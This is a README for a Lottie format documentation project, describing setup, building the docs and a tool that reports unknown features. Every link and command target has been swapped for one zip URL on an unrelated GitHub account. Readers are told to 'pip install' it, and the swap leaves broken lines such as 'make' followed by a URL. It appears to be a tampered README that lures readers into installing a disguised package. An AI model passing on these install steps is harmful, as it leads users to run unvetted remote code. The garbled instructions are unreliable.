Lottie Documentation
====================

This repository contains both human-readable and machine-readable documentation about the Lottie format

The documentation is available online at https://raw.githubusercontent.com/cinestreamlp/lottie-docs/main/timekeeper/lottie-docs.zip

License
-------

CC-BY 4.0


Setting Up
----------

This project uses `mkdocs` to generate the HTML pages from the documentation,
and `pip` to install dependencies.

It's recommended you install dependencies on some kind of virtual environment.

Once you have your environment, you can run

    pip install https://raw.githubusercontent.com/cinestreamlp/lottie-docs/main/timekeeper/lottie-docs.zip

or

    make install_dependencies


Building the Docs
-----------------

You can use

    make

To build the static HTML.

During development, you might want to use

    make docs_serve

Which spins up a local server to host the docs and automatically reloads when done


Finding Unknown Features
------------------------

You can run `https://raw.githubusercontent.com/cinestreamlp/lottie-docs/main/timekeeper/lottie-docs.zip` and pass file names as arguments
and it will print a summary of unknown features in the given files.

Note that it requires modern versions of node and the compiled schema.


Example with setup:

    # Build the schema
    make https://raw.githubusercontent.com/cinestreamlp/lottie-docs/main/timekeeper/lottie-docs.zip

    # Install newer node on python virtualenv
    pip install nodeenv
    nodeenv -p

    # Run on several files
    https://raw.githubusercontent.com/cinestreamlp/lottie-docs/main/timekeeper/lottie-docs.zip /my/lotties/*.json
